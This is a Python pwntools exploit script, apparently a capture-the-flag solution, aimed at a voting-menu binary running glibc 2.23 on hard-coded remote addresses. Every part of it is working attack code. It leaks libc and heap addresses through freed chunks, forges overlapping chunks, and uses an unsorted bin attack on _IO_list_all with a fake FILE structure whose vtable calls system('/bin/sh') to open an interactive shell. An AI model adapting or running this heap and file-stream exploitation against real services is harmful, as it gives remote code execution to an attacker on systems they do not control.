# coding:utf-8
from pwn import *

libc = ELF("./libc-2.23.so")
LOCAL = False
if LOCAL:
    context.log_level = 'debug'
    io = remote("10.211.55.9", 22333)
    main_arena_off = 0x3c4b78
else:
    main_arena_off = 0x3c4b78
    #io = remote("47.90.103.10", 6000)
    io = remote("47.97.190.1", 6000)

def mmenu(choice):
    io.recvuntil("Action: ")
    io.sendline(str(choice))

def create(msize, content):
    mmenu(0)
    io.recvuntil("the name's size: ")
    io.sendline(str(msize))
    io.recvuntil("Please enter the name: ")
    io.send(content)

def show(idx):
    mmenu(1)
    io.recvuntil("Please enter the index: ")
    io.sendline(str(idx))

def vote(idx):
    mmenu(2)
    io.recvuntil("Please enter the index: ")
    io.sendline(str(idx))

def result():
    mmenu(3)

def vcancel(idx):
    mmenu(4)
    io.recvuntil("Please enter the index: ")
    io.sendline(str(idx))

def pwnit():
    create(0xE8, 'a0\n')
    create(0x18, 'a1\n')
    create(0xE8, 'a2\n')
    create(0xE8, 'a3\n')
    pay4load = '4'*0x180 + p64(0) + p64(0x81) + '\n'
    create(0x208, pay4load)
    create(0x30, 'a5\n')
    vcancel(0)
    vcancel(2)
    show(0)
    io.recvuntil("count: ")
    libc.address = int(io.recvline()[:-1]) - main_arena_off
    log.success("libc address: " + hex(libc.address))
    io.recvuntil("time: ")
    heap_address  = int(io.recvline()[:-1]) - 0x130
    log.success("heap address: " + hex(heap_address))
    vcancel(3)
    # overlap
    fake_chunk = '6'*0xE0
    fake_chunk += p64(0) + p64(0x2A1)   # change size bigger
    fake_chunk += p64(0xFFFFFFFFFFFFFFFF) + p64(0x555555)
    fake_chunk += '\n'
    create(0x1E8, fake_chunk)   # 6
    create(0xE8, 'a7\n')    # clear unsorted bin
    vcancel(3)
    vcancel(4)  # now unsorted bin have 2 chunks
    # unsorted bin attack
    payload = 'a'*0xE0
    vtable_addr = heap_address + 0x410
    fake_fileio = "/bin/sh\x00" + p64(0x61)
    fake_fileio += p64(0xdada) + p64(libc.symbols["_IO_list_all"]-0x10)
    fake_fileio += p64(0)+p64(1) #_IO_write_base ; _IO_write_ptr
    fake_fileio = fake_fileio.ljust(0xc0, chr(0))
    fake_fileio += p64(0)
    payload += fake_fileio
    payload += p64(0)
    payload += p64(0)
    payload += p64(vtable_addr)
    payload += p64(1)
    payload += p64(2)
    payload += p64(3)
    payload += p64(libc.symbols["system"])
    payload += '\n'
    create(0x288, payload)  # size 0x2A1
    # now chunk3 removed from unsorted bin, unsorted bin only has chunk4
    pause()
    mmenu(0)
    io.recvuntil("the name's size: ")
    io.sendline(str(48))
    io.interactive()

if __name__ == "__main__":
    pwnit()
    pause()

